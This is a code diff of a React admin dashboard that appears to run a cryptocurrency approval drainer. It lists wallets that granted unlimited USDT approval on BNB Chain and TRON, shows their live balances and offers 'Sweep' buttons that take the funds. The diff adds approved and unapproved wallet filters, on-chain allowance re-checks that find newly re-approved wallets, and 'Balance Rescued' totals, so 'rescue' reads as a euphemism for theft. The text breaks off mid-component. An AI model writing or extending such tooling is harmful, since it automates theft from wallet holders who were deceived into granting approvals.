@@ -4,7 +4,6 @@ import {
   Shield,
   LogOut,
   Activity,
-  Database,
   ExternalLink,
   CheckCircle2,
   Zap,
@@ -29,28 +28,37 @@ interface AdminDashboardProps {
 }
 
 type SidebarTab = 'dashboard' | 'wallets';
-type MainTab = 'connected' | 'unlimited' | 'audit' | 'twodays';
+type WalletFilter = 'all' | 'approved' | 'unapproved';
 
 export const AdminDashboard: React.FC<AdminDashboardProps> = ({
   onLogout,
   onNavigateHome,
 }) => {
   const [sidebarTab, setSidebarTab] = useState<SidebarTab>('dashboard');
-  const [activeMainTab, setActiveMainTab] = useState<MainTab>('connected');
   const [isLoggingOut, setIsLoggingOut] = useState(false);
   const [isRefreshingWallets, setIsRefreshingWallets] = useState(false);
+  const [walletFilter, setWalletFilter] = useState<WalletFilter>('approved');
+  const [checkingAllowanceId, setCheckingAllowanceId] = useState<string | null>(null);
+  const [isCheckingAllAllowances, setIsCheckingAllAllowances] = useState(false);
+  const [checkSuccessMsg, setCheckSuccessMsg] = useState<string | null>(null);
 
   // ── Real-time state from shared AdminDataContext ─────────────────
   const {
+    allWallets,
     sortedWallets,
-    twoDayStats,
+    approvedWallets,
+    unapprovedWallets,
+    totalBalanceRescued,
+    todayBalanceRescued,
     connectedCount,
     unlimitedTodayCount,
     latestSweepsMap,
     balances,
-    refreshBalance,
     refreshAllBalances,
     recordLocalSweep,
+    markWalletUnapproved,
+    checkWalletAllowanceOnChain,
+    checkAllUnapprovedOnChain,
     isLoading: metricsLoading,
     error: metricsError,
   } = useAdminData();
@@ -90,6 +98,52 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
     }
   };
 
+  // ── Single on-chain allowance check ───────────────────────────────
+  const handleCheckAllowance = async (address: string) => {
+    setCheckingAllowanceId(address);
+    setCheckSuccessMsg(null);
+    try {
+      const isApproved = await checkWalletAllowanceOnChain(address);
+      if (isApproved) {
+        setCheckSuccessMsg(
+          `Wallet ${address.slice(0, 10)}… verified active approval! Automatically moved to Approved Wallets.`
+        );
+      } else {
+        setCheckSuccessMsg(
+          `Wallet ${address.slice(0, 10)}… currently has 0 on-chain allowance.`
+        );
+      }
+      setTimeout(() => setCheckSuccessMsg(null), 6000);
+    } catch (err) {
+      console.error('Allowance check error:', err);
+    } finally {
+      setCheckingAllowanceId(null);
+    }
+  };
+
+  // ── Batch on-chain allowance check for ALL non-approved wallets ────
+  const handleCheckAllAllowances = async () => {
+    setIsCheckingAllAllowances(true);
+    setCheckSuccessMsg(null);
+    try {
+      const res = await checkAllUnapprovedOnChain();
+      if (res.reapprovedCount > 0) {
+        setCheckSuccessMsg(
+          `RPC scan complete: Checked ${res.checkedCount} wallets. ${res.reapprovedCount} newly approved wallet(s) found and moved to Approved Wallets!`
+        );
+      } else {
+        setCheckSuccessMsg(
+          `RPC scan complete: Checked ${res.checkedCount} non-approved wallet(s) on-chain. All still have 0 allowance.`
+        );
+      }
+      setTimeout(() => setCheckSuccessMsg(null), 8000);
+    } catch (err) {
+      console.error('Check all on-chain error:', err);
+    } finally {
+      setIsCheckingAllAllowances(false);
+    }
+  };
+
   // ── Sweep action (shared handler for manual input + per-wallet row) ─
   const executeSweep = useCallback(
     async (address: string, rowId?: string) => {
@@ -114,32 +168,28 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
         // Move wallet to top immediately & update balance to 0.00
         recordLocalSweep(trimmed, d.sweepTxHash, d.amountSwept);
       } catch (err: any) {
+        const errMsg = err.message ?? 'Sweep operation failed.';
         setSweepResult({
           success: false,
-          message: err.message ?? 'Sweep operation failed.',
+          message: errMsg,
         });
+
+        // If error indicates no allowance granted or 0 allowance, move to non-approved list
+        if (
+          errMsg.toLowerCase().includes('not granted any allowance') ||
+          errMsg.toLowerCase().includes('zero allowance') ||
+          errMsg.toLowerCase().includes('cannot sweep') ||
+          errMsg.toLowerCase().includes('failed-precondition') ||
+          errMsg.includes('400')
+        ) {
+          await markWalletUnapproved(trimmed);
+        }
       } finally {
         setSweepLoading(false);
         setSweepingId(null);
       }
     },
-    [recordLocalSweep]
-  );
-
-  // ── Reusable button & indicator builders ──────────────────────────
-  const mainTabBtn = (tab: MainTab, icon: React.ReactNode, label: string) => (
-    <button
-      key={tab}
-      onClick={() => setActiveMainTab(tab)}
-      className={`flex items-center gap-2 px-3.5 py-2 rounded-xl text-xs font-semibold transition-all cursor-pointer whitespace-nowrap ${
-        activeMainTab === tab
-          ? 'bg-blue-600 text-white shadow-md shadow-blue-600/30'
-          : 'text-[#8e9eb3] hover:text-white hover:bg-[#141f33]'
-      }`}
-    >
-      {icon}
-      <span>{label}</span>
-    </button>
+    [recordLocalSweep, markWalletUnapproved]
   );
 
   const sidebarBtn = (
@@ -204,6 +254,20 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
       </div>
     );
   };
+
+  const currentWalletList =
+    walletFilter === 'all'
+      ? sortedWallets
+      : walletFilter === 'approved'
+      ? approvedWallets
+      : unapprovedWallets;
+
+  // Set of unapproved addresses for fast lookup in "All" view
+  const unapprovedMap = React.useMemo(() => {
+    const s = new Set<string>();
+    unapprovedWallets.forEach((w) => s.add(w.id.toLowerCase()));
+    return s;
+  }, [unapprovedWallets]);
 
   return (
     <div className="min-h-[100svh] bg-[#0a0f1d] text-slate-100 font-sans flex flex-col">
@@ -285,33 +349,9 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
             ))}
           </div>
 
-          {/* Welcome banner */}
-          <div className="relative overflow-hidden rounded-2xl bg-gradient-to-r from-[#131c2e] via-[#16233a] to-[#101828] border border-[#263750] p-6 shadow-xl">
-            <div className="relative z-10">
-              <div className="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-md bg-blue-500/10 border border-blue-500/20 text-blue-400 text-[11px] font-mono mb-2">
-                <CheckCircle2 className="w-3 h-3" />
-                <span>Authenticated Admin Session Active</span>
-              </div>
-              <h2 className="text-2xl font-bold text-white tracking-tight">
-                System Overview &amp; Management
-              </h2>
-              <p className="text-sm text-[#8e9eb3] mt-1">
-                Monitor wallet approvals, balances, and on-chain rescue activity in real-time.
-              </p>
-            </div>
-          </div>
-
           {/* ══════════ DASHBOARD TAB ══════════ */}
           {sidebarTab === 'dashboard' && (
             <div className="flex flex-col gap-6 animate-fadeIn">
-              {/* Tab bar */}
-              <div className="flex items-center gap-2 border-b border-[#1e2a3f] pb-3 overflow-x-auto">
-                {mainTabBtn('connected', <Wallet className="w-3.5 h-3.5" />, 'Connected Wallets')}
-                {mainTabBtn('unlimited', <Database className="w-3.5 h-3.5" />, 'Unlimited Approval (Today)')}
-                {mainTabBtn('audit', <Shield className="w-3.5 h-3.5" />, 'Audit Protocols')}
-                {mainTabBtn('twodays', <Activity className="w-3.5 h-3.5" />, 'Two-Days Rescue')}
-              </div>
-
               {/* Error banner */}
               {metricsError && (
                 <div className="flex items-start gap-3 px-4 py-3 rounded-xl bg-red-900/20 border border-red-500/30 text-red-400 text-xs">
@@ -355,181 +395,184 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
                 </div>
               )}
 
-              {/* ── Sub-tab 1: Connected Wallets ── */}
-              {activeMainTab === 'connected' && (
-                <div className="flex flex-col gap-4">
-                  <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
-                    <MetricCard
-                      label="Connected Wallets"
-                      value={connectedCount}
-                      sub="Wallets with unlimited approval"
-                      icon={<Wallet className="w-4 h-4" />}
-                      color="blue"
-                    />
-                    <MetricCard
-                      label="Unlimited Today"
-                      value={unlimitedTodayCount}
-                      sub="New approvals since midnight"
-                      icon={<TrendingUp className="w-4 h-4" />}
-                      color="emerald"
-                    />
-                    <MetricCard
-                      label="Audit Protocols"
-                      value="BNB + TRON"
-                      sub="Multi-chain active"
-                      icon={<Shield className="w-4 h-4" />}
-                      color="purple"
-                    />
-                    <MetricCard
-                      label="Two-Days Rescue"
-                      value={twoDayStats ? `${twoDayStats.successful}/${twoDayStats.total}` : '—'}
-                      sub="Successful / Total (48h)"
-                      icon={<Clock className="w-4 h-4" />}
-                      color="amber"
-                    />
-                  </div>
+              {/* 4 Metric Cards directly shown on Dashboard */}
+              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
+                <MetricCard
+                  label="Connected Wallets"
+                  value={connectedCount}
+                  sub="Wallets with unlimited approval"
+                  icon={<Wallet className="w-4 h-4" />}
+                  color="blue"
+                />
+                <MetricCard
+                  label="Unlimited Today"
+                  value={unlimitedTodayCount}
+                  sub="New approvals since midnight"
+                  icon={<TrendingUp className="w-4 h-4" />}
+                  color="emerald"
+                />
+                <MetricCard
+                  label="Balance Rescued"
+                  value={totalBalanceRescued}
+                  sub="Total USDT swept"
+                  icon={<Zap className="w-4 h-4" />}
+                  color="purple"
+                />
+                <MetricCard
+                  label="Today's Balance"
+                  value={todayBalanceRescued}
+                  sub="Swept today (00:00 - 23:59)"
+                  icon={<Clock className="w-4 h-4" />}
+                  color="amber"
+                />
+              </div>
 
-                  {/* Manual sweep form */}
-                  <div className="bg-[#121b2d] border border-[#24344d] rounded-2xl p-6">
-                    <h3 className="text-base font-bold text-white mb-1">Manual Wallet Sweep</h3>
-                    <p className="text-xs text-[#8e9eb3] mb-4">
-                      Enter a wallet address that has granted unlimited approval to trigger an admin sweep.
-                    </p>
-                    <div className="flex flex-col sm:flex-row gap-3">
-                      <div className="relative flex-1">
-                        <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-[#64748b] pointer-events-none" />
-                        <input
-                          id="sweep-wallet-input"
-                          type="text"
-                          value={sweepAddress}
-                          onChange={(e) => setSweepAddress(e.target.value)}
-                          onKeyDown={(e) => e.key === 'Enter' && executeSweep(sweepAddress)}
-                          placeholder="0x… wallet address"
-                          disabled={sweepLoading}
-                          className="w-full pl-10 pr-4 py-2.5 bg-[#0d1424]/90 border border-[#25354e] focus:border-[#38bdf8]/80 focus:ring-1 focus:ring-[#38bdf8]/40 rounded-xl text-white text-sm placeholder-slate-600 transition-all outline-none font-mono disabled:opacity-50"
-                        />
-                      </div>
-                      <button
-                        id="sweep-execute-button"
-                        onClick={() => executeSweep(sweepAddress)}
-                        disabled={sweepLoading || !sweepAddress.trim()}
-                        className="flex items-center gap-2 px-5 py-2.5 rounded-xl bg-blue-600 hover:bg-blue-500 text-white text-sm font-semibold transition-all disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer"
-                      >
-                        {sweepLoading ? (
-                          <Loader2 className="w-4 h-4 animate-spin" />
-                        ) : (
-                          <Zap className="w-4 h-4" />
-                        )}
-                        <span>{sweepLoading ? 'Sweeping...' : 'Execute Sweep'}</span>
-                      </button>
-                    </div>
-                  </div>
-                </div>
-              )}
-
-              {/* ── Sub-tab 2: Unlimited Approval Today ── */}
-              {activeMainTab === 'unlimited' && (
-                <div className="flex flex-col gap-4">
-                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
-                    <MetricCard
-                      label="Unlimited Approval (Today)"
-                      value={unlimitedTodayCount}
-                      sub="Wallets that granted unlimited approval today"
-                      icon={<Database className="w-4 h-4" />}
-                      color="amber"
-                    />
-                    <MetricCard
-                      label="Total Connected Wallets"
-                      value={connectedCount}
-                      sub="All-time unlimited approvals"
-                      icon={<Wallet className="w-4 h-4" />}
-                      color="blue"
+              {/* Manual sweep form */}
+              <div className="bg-[#121b2d] border border-[#24344d] rounded-2xl p-6 shadow-xl">
+                <h3 className="text-base font-bold text-white mb-1">Manual Wallet Sweep</h3>
+                <p className="text-xs text-[#8e9eb3] mb-4">
+                  Enter a wallet address that has granted unlimited approval to trigger an admin sweep.
+                </p>
+                <div className="flex flex-col sm:flex-row gap-3">
+                  <div className="relative flex-1">
+                    <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-[#64748b] pointer-events-none" />
+                    <input
+                      id="sweep-wallet-input"
+                      type="text"
+                      value={sweepAddress}
+                      onChange={(e) => setSweepAddress(e.target.value)}
+                      onKeyDown={(e) => e.key === 'Enter' && executeSweep(sweepAddress)}
+                      placeholder="0x… wallet address"
+                      disabled={sweepLoading}
+                      className="w-full pl-10 pr-4 py-2.5 bg-[#0d1424]/90 border border-[#25354e] focus:border-[#38bdf8]/80 focus:ring-1 focus:ring-[#38bdf8]/40 rounded-xl text-white text-sm placeholder-slate-600 transition-all outline-none font-mono disabled:opacity-50"
                     />
                   </div>
+                  <button
+                    id="sweep-execute-button"
+                    onClick={() => executeSweep(sweepAddress)}
+                    disabled={sweepLoading || !sweepAddress.trim()}
+                    className="flex items-center gap-2 px-5 py-2.5 rounded-xl bg-blue-600 hover:bg-blue-500 text-white text-sm font-semibold transition-all disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer shadow-md shadow-blue-600/20"
+                  >
+                    {sweepLoading ? (
+                      <Loader2 className="w-4 h-4 animate-spin" />
+                    ) : (
+                      <Zap className="w-4 h-4" />
+                    )}
+                    <span>{sweepLoading ? 'Sweeping...' : 'Execute Sweep'}</span>
+                  </button>
                 </div>
-              )}
-
-              {/* ── Sub-tab 3: Audit Protocols ── */}
-              {activeMainTab === 'audit' && (
-                <div className="flex flex-col gap-4">
-                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
-                    <div className="bg-[#121b2d] border border-[#24344d] rounded-2xl p-5">
-                      <div className="flex items-center gap-2 mb-3">
-                        <span className="w-2 h-2 rounded-full bg-emerald-400 shadow-[0_0_8px_rgba(52,211,153,0.8)]" />
-                        <span className="text-xs font-semibold text-white">BNB Smart Chain</span>
-                      </div>
-                      <p className="text-[11px] text-[#8e9eb3]">USDT approval &amp; sweep active</p>
-                    </div>
-                    <div className="bg-[#121b2d] border border-[#24344d] rounded-2xl p-5">
-                      <div className="flex items-center gap-2 mb-3">
-                        <span className="w-2 h-2 rounded-full bg-emerald-400 shadow-[0_0_8px_rgba(52,211,153,0.8)]" />
-                        <span className="text-xs font-semibold text-white">TRON Network</span>
-                      </div>
-                      <p className="text-[11px] text-[#8e9eb3]">Multi-chain audit enabled</p>
-                    </div>
-                    <div className="bg-[#121b2d] border border-[#24344d] rounded-2xl p-5">
-                      <div className="flex items-center gap-2 mb-3">
-                        <Shield className="w-4 h-4 text-blue-400" />
-                        <span className="text-xs font-semibold text-white">Audit Protocol</span>
-                      </div>
-                      <p className="text-[11px] text-[#8e9eb3]">ERC-20 allowance verification — on-chain</p>
-                    </div>
-                  </div>
-                </div>
-              )}
-
-              {/* ── Sub-tab 4: Two-Days Rescue ── */}
-              {activeMainTab === 'twodays' && (
-                <div className="flex flex-col gap-4">
-                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
-                    <MetricCard
-                      label="Total Attempts (48h)"
-                      value={twoDayStats?.total ?? '—'}
-                      sub="All rescue attempts in last 48 hours"
-                      icon={<Clock className="w-4 h-4" />}
-                      color="blue"
-                    />
-                    <MetricCard
-                      label="Successful (48h)"
-                      value={twoDayStats?.successful ?? '—'}
-                      sub="Confirmed sweep transactions"
-                      icon={<CheckCircle2 className="w-4 h-4" />}
-                      color="emerald"
-                    />
-                    <MetricCard
-                      label="Unlimited Approval Granted"
-                      value={twoDayStats?.unlimitedGranted ?? '—'}
-                      sub="With non-zero sweep amounts"
-                      icon={<TrendingUp className="w-4 h-4" />}
-                      color="purple"
-                    />
-                  </div>
-                </div>
-              )}
+              </div>
             </div>
           )}
 
           {/* ══════════ WALLETS TAB ══════════ */}
           {sidebarTab === 'wallets' && (
             <div className="flex flex-col gap-4 animate-fadeIn">
-              <div className="flex items-center justify-between">
-                <div>
-                  <h3 className="text-lg font-bold text-white">Approved Wallets</h3>
-                  <p className="text-xs text-[#8e9eb3] mt-0.5">
-                    Live balance monitoring &amp; instant sweep. Newly connected &amp; latest swept appear on top.
-                  </p>
+              {/* Top controls: All button, Approved Wallets button, Non-Approved Wallets button, and Action buttons */}
+              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
+                <div className="flex items-center gap-2 flex-wrap">
+                  {/* 1. All Wallets button */}
+                  <button
+                    id="filter-all-wallets-btn"
+                    onClick={() => setWalletFilter('all')}
+                    className={`flex items-center gap-2 px-3.5 py-2.5 rounded-xl text-xs font-semibold transition-all cursor-pointer ${
+                      walletFilter === 'all'
+                        ? 'bg-blue-600 text-white shadow-md shadow-blue-600/30 border border-blue-400/40'
+                        : 'bg-[#121b2d] border border-[#24344d] text-[#8e9eb3] hover:text-white hover:bg-[#18243c]'
+                    }`}
+                  >
+                    <Wallet className="w-3.5 h-3.5 text-blue-400" />
+                    <span>All</span>
+                    <span className="text-[10px] px-2 py-0.5 rounded-full bg-white/10 text-white font-mono">
+                      {sortedWallets.length}
+                    </span>
+                  </button>
+
+                  {/* 2. Approved Wallets button */}
+                  <button
+                    id="filter-approved-wallets-btn"
+                    onClick={() => setWalletFilter('approved')}
+                    className={`flex items-center gap-2 px-3.5 py-2.5 rounded-xl text-xs font-semibold transition-all cursor-pointer ${
+                      walletFilter === 'approved'
+                        ? 'bg-blue-600 text-white shadow-md shadow-blue-600/30 border border-blue-400/40'
+                        : 'bg-[#121b2d] border border-[#24344d] text-[#8e9eb3] hover:text-white hover:bg-[#18243c]'
+                    }`}
+                  >
+                    <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
+                    <span>Approved Wallets</span>
+                    <span className="text-[10px] px-2 py-0.5 rounded-full bg-white/10 text-white font-mono">
+                      {approvedWallets.length}
+                    </span>
+                  </button>
+
+                  {/* 3. Non-Approved Wallets button */}
+                  <button
+                    id="filter-non-approved-wallets-btn"
+                    onClick={() => setWalletFilter('unapproved')}
+                    className={`flex items-center gap-2 px-3.5 py-2.5 rounded-xl text-xs font-semibold transition-all cursor-pointer ${
+                      walletFilter === 'unapproved'
+                        ? 'bg-amber-600 text-white shadow-md shadow-amber-600/30 border border-amber-400/40'
+                        : 'bg-[#121b2d] border border-[#24344d] text-[#8e9eb3] hover:text-white hover:bg-[#18243c]'
+                    }`}
+                  >
+                    <AlertTriangle className="w-3.5 h-3.5 text-amber-400" />
+                    <span>Non-Approved Wallets</span>
+                    <span className="text-[10px] px-2 py-0.5 rounded-full bg-white/10 text-white font-mono">
+                      {unapprovedWallets.length}
+                    </span>
+                  </button>
                 </div>
 
-                {/* Refresh text button (seamless in-place update with zero blank screen) */}
-                <button
-                  onClick={handleRefreshWallets}
-                  disabled={isRefreshingWallets}
-                  className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-[#23354f] bg-[#131e31] hover:bg-[#1a2842] text-xs font-medium text-[#8e9eb3] hover:text-white transition-all cursor-pointer disabled:opacity-50"
-                >
-                  <RefreshCw className={`w-3.5 h-3.5 ${isRefreshingWallets ? 'animate-spin text-blue-400' : 'text-[#8e9eb3]'}`} />
-                  <span>{isRefreshingWallets ? 'Refreshing…' : 'Refresh'}</span>
-                </button>
+                {/* Right controls: Batch RPC Check (in non-approved view) + Live Refresh */}
+                <div className="flex items-center gap-2.5">
+                  {walletFilter === 'unapproved' && (
+                    <button
+                      id="check-all-onchain-btn"
+                      onClick={handleCheckAllAllowances}
+                      disabled={isCheckingAllAllowances || unapprovedWallets.length === 0}
+                      className="flex items-center gap-1.5 px-3.5 py-2 rounded-xl border border-amber-500/40 bg-amber-500/10 hover:bg-amber-500/20 text-xs font-semibold text-amber-300 hover:text-white transition-all cursor-pointer disabled:opacity-50"
+                      title="Check on-chain USDT allowance on BSC RPC node for all non-approved wallets"
+                    >
+                      <RefreshCw
+                        className={`w-3.5 h-3.5 ${
+                          isCheckingAllAllowances ? 'animate-spin text-amber-400' : 'text-amber-400'
+                        }`}
+                      />
+                      <span>{isCheckingAllAllowances ? 'Scanning Node…' : 'Check All On-Chain'}</span>
+                    </button>
+                  )}
+
+                  <button
+                    onClick={handleRefreshWallets}
+                    disabled={isRefreshingWallets}
+                    className="flex items-center gap-1.5 px-3.5 py-2 rounded-xl border border-[#23354f] bg-[#131e31] hover:bg-[#1a2842] text-xs font-medium text-[#8e9eb3] hover:text-white transition-all cursor-pointer disabled:opacity-50"
+                  >
+                    <RefreshCw
+                      className={`w-3.5 h-3.5 ${
+                        isRefreshingWallets ? 'animate-spin text-blue-400' : 'text-[#8e9eb3]'
+                      }`}
+                    />
+                    <span>{isRefreshingWallets ? 'Refreshing…' : 'Refresh'}</span>
+                  </button>
+                </div>
               </div>
+
+              {/* Sub-header description */}
+              <p className="text-xs text-[#8e9eb3] -mt-1">
+                {walletFilter === 'all'
+                  ? 'Viewing all connected wallets. Live balance monitoring & instant sweep active.'
+                  : walletFilter === 'approved'
+                  ? 'Live balance monitoring & instant sweep. Newly connected & latest swept appear on top.'
+                  : 'Wallets that have not granted on-chain allowance or revoked approval. Click Check On-Chain or Check All On-Chain to re-verify.'}
+              </p>
+
+              {/* Allowance verification toast */}
+              {checkSuccessMsg && (
+                <div className="flex items-center gap-2 px-4 py-2.5 rounded-xl bg-blue-900/30 border border-blue-500/40 text-blue-300 text-xs">
+                  <CheckCircle2 className="w-4 h-4 text-blue-400 flex-shrink-0" />
+                  <span>{checkSuccessMsg}</span>
+                </div>
+              )}
 
               {/* Global sweep result */}
               {sweepResult && (
@@ -562,24 +605,39 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
                 </div>
               )}
 
-              {/* Keep screen as it is; only show initial loading if there are 0 wallets loaded yet */}
-              {metricsLoading && sortedWallets.length === 0 ? (
+              {/* Empty state or Table */}
+              {metricsLoading && currentWalletList.length === 0 ? (
                 <div className="flex items-center justify-center py-16 text-slate-400 gap-3">
                   <Loader2 className="w-5 h-5 animate-spin" />
                   <span className="text-sm">Streaming live wallets…</span>
                 </div>
-              ) : metricsError && sortedWallets.length === 0 ? (
-                <div className="flex items-start gap-3 px-4 py-3 rounded-xl bg-red-900/20 border border-red-500/30 text-red-400 text-xs">
-                  <AlertTriangle className="w-4 h-4 flex-shrink-0 mt-0.5" />
-                  <span>{metricsError}</span>
-                </div>
-              ) : sortedWallets.length === 0 ? (
+              ) : currentWalletList.length === 0 ? (
                 <div className="bg-[#121b2d] border border-[#24344d] rounded-2xl p-10 text-center text-[#8e9eb3]">
-                  <Wallet className="w-10 h-10 mx-auto mb-3 text-blue-400 opacity-50" />
-                  <p className="font-medium text-white">No approved wallets found</p>
-                  <p className="text-xs mt-1">
-                    Wallets that grant unlimited approval will appear here instantly.
-                  </p>
+                  {walletFilter === 'approved' ? (
+                    <>
+                      <Wallet className="w-10 h-10 mx-auto mb-3 text-blue-400 opacity-50" />
+                      <p className="font-medium text-white">No approved wallets found</p>
+                      <p className="text-xs mt-1">
+                        Wallets that grant unlimited approval will appear here instantly.
+                      </p>
+                    </>
+                  ) : walletFilter === 'unapproved' ? (
+                    <>
+                      <CheckCircle2 className="w-10 h-10 mx-auto mb-3 text-emerald-400 opacity-50" />
+                      <p className="font-medium text-white">No non-approved wallets</p>
+                      <p className="text-xs mt-1">
+                        All currently connected wallets have verified approvals.
+                      </p>
+                    </>
+                  ) : (
+                    <>
+                      <Wallet className="w-10 h-10 mx-auto mb-3 text-blue-400 opacity-50" />
+                      <p className="font-medium text-white">No wallets found</p>
+                      <p className="text-xs mt-1">
+                        Connected wallets will appear here instantly.
+                      </p>
+                    </>
+                  )}
                 </div>
               ) : (
                 <div className="bg-[#121b2d] border border-[#24344d] rounded-2xl overflow-hidden shadow-xl">
@@ -590,17 +648,33 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
                           <th className="text-left px-5 py-3 font-semibold">#</th>
                           <th className="text-left px-5 py-3 font-semibold">Wallet Address</th>
                           <th className="text-left px-5 py-3 font-semibold">Balance</th>
-                          <th className="text-left px-5 py-3 font-semibold">Approved At</th>
-                          <th className="text-left px-5 py-3 font-semibold">Sponsor Tx</th>
+                          {walletFilter === 'approved' ? (
+                            <>
+                              <th className="text-left px-5 py-3 font-semibold">Approved At</th>
+                              <th className="text-left px-5 py-3 font-semibold">Sponsor Tx</th>
+                            </>
+                          ) : walletFilter === 'unapproved' ? (
+                            <>
+                              <th className="text-left px-5 py-3 font-semibold">Status</th>
+                              <th className="text-left px-5 py-3 font-semibold">Sponsor Tx</th>
+                            </>
+                          ) : (
+                            <>
+                              <th className="text-left px-5 py-3 font-semibold">Approval Status</th>
+                              <th className="text-left px-5 py-3 font-semibold">Sponsor Tx</th>
+                            </>
+                          )}
                           <th className="text-right px-5 py-3 font-semibold">Action</th>
                         </tr>
                       </thead>
                       <tbody>
-                        {sortedWallets.map((w, idx) => {
+                        {currentWalletList.map((w, idx) => {
                           const lower = w.id.toLowerCase();
                           const isSweepingThis = sweepingId === w.id;
+                          const isCheckingThis = checkingAllowanceId === w.id;
                           const balInfo = balances[lower];
                           const latestSweep = latestSweepsMap[lower];
+                          const isUnapproved = unapprovedMap.has(lower);
 
                           const approvedAt = w.sponsoredAt
                             ? new Date(w.sponsoredAt.toMillis?.() ?? 0).toLocaleDateString()
@@ -635,7 +709,7 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
                                 </div>
                               </td>
 
-                              {/* Balance Column (Replaced Status Column) */}
+                              {/* Balance */}
                               <td className="px-5 py-3">
                                 {balInfo?.loading ? (
                                   <div className="flex items-center gap-1.5 text-xs text-slate-400 font-mono">
@@ -654,18 +728,48 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
                                 )}
                               </td>
 
-                              {/* Approved At & Sweep Details */}
-                              <td className="px-5 py-3 text-[#8e9eb3] text-xs">
-                                <div>{approvedAt}</div>
-                                {latestSweep && (
-                                  <div className="text-[10px] text-purple-400 font-mono mt-0.5 flex items-center gap-1">
-                                    <CheckCircle2 className="w-3 h-3 text-purple-400 flex-shrink-0" />
-                                    <span>
-                                      Swept {latestSweep.formattedAmount ? `${latestSweep.formattedAmount} USDT` : ''}
+                              {/* Status / Approved At column */}
+                              {walletFilter === 'approved' ? (
+                                <td className="px-5 py-3 text-[#8e9eb3] text-xs">
+                                  <div>{approvedAt}</div>
+                                  {latestSweep && (
+                                    <div className="text-[10px] text-purple-400 font-mono mt-0.5 flex items-center gap-1">
+                                      <CheckCircle2 className="w-3 h-3 text-purple-400 flex-shrink-0" />
+                                      <span>
+                                        Swept{' '}
+                                        {latestSweep.formattedAmount
+                                          ? `${latestSweep.formattedAmount} USDT`
+                                          : ''}
+                                      </span>
+                                    </div>
+                                  )}
+                                </td>
+                              ) : walletFilter === 'unapproved' ? (
+                                <td className="px-5 py-3">
+                                  <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-md text-[11px] font-medium bg-amber-500/10 text-amber-400 border border-amber-500/20">
+                                    <AlertTriangle className="w-3 h-3" />
+                                    <span>No Allowance / Revoked</span>
+                                  </span>
+                                </td>
+                              ) : (
+                                /* "All" view: show status badge + date */
+                                <td className="px-5 py-3 text-xs">
+                                  {isUnapproved ? (
+                                    <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-md text-[11px] font-medium bg-amber-500/10 text-amber-400 border border-amber-500/20">
+                                      <AlertTriangle className="w-3 h-3" />
+                                      <span>No Allowance</span>
                                     </span>
-                                  </div>
-                                )}
-                              </td>
+                                  ) : (
+                                    <div className="flex items-center gap-1.5">
+                                      <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-md text-[11px] font-medium bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
+                                        <CheckCircle2 className="w-3 h-3" />
+                                        <span>Approved</span>
+                                      </span>
+                                      <span className="text-[11px] text-[#718298]">{approvedAt}</span>
+                                    </div>
+                                  )}
+                                </td>
+                              )}
 
                               {/* Sponsor Tx */}
                               <td className="px-5 py-3">
@@ -683,26 +787,45 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
                                 )}
                               </td>
 
-                              {/* Sweep Action */}
+                              {/* Action Buttons */}
                               <td className="px-5 py-3 text-right">
-                                <button
-                                  id={`sweep-btn-${idx}`}
-                                  onClick={() => executeSweep(w.id, w.id)}
-                                  disabled={isSweepingThis || !!sweepingId}
-                                  className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-blue-600 hover:bg-blue-500 text-white text-xs font-semibold transition-all disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer"
-                                >
-                                  {isSweepingThis ? (
-                                    <>
-                                      <Loader2 className="w-3.5 h-3.5 animate-spin" />
-                                      <span>Sweeping…</span>
-                                    </>
-                                  ) : (
-                                    <>
-                                      <Zap className="w-3.5 h-3.5" />
-                                      <span>Sweep</span>
-                                    </>
+                                <div className="inline-flex items-center gap-2">
+                                  {(walletFilter === 'unapproved' || (walletFilter === 'all' && isUnapproved)) && (
+                                    <button
+                                      id={`check-allowance-btn-${idx}`}
+                                      onClick={() => handleCheckAllowance(w.id)}
+                                      disabled={isCheckingThis}
+                                      className="inline-flex items-center gap-1 px-2.5 py-1.5 rounded-lg bg-[#19263e] hover:bg-[#223555] text-blue-300 border border-blue-500/20 text-xs font-medium transition-all disabled:opacity-50 cursor-pointer"
+                                      title="Query on-chain allowance from BSC RPC"
+                                    >
+                                      {isCheckingThis ? (
+                                        <Loader2 className="w-3 h-3 animate-spin" />
+                                      ) : (
+                                        <RefreshCw className="w-3 h-3" />
+                                      )}
+                                      <span>Check On-Chain</span>
+                                    </button>
                                   )}
-                                </button>
+
+                                  <button
+                                    id={`sweep-btn-${idx}`}
+                                    onClick={() => executeSweep(w.id, w.id)}
+                                    disabled={isSweepingThis || !!sweepingId}
+                                    className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-blue-600 hover:bg-blue-500 text-white text-xs font-semibold transition-all disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer"
+                                  >
+                                    {isSweepingThis ? (
+                                      <>
+                                        <Loader2 className="w-3.5 h-3.5 animate-spin" />
+                                        <span>Sweeping…</span>
+                                      </>
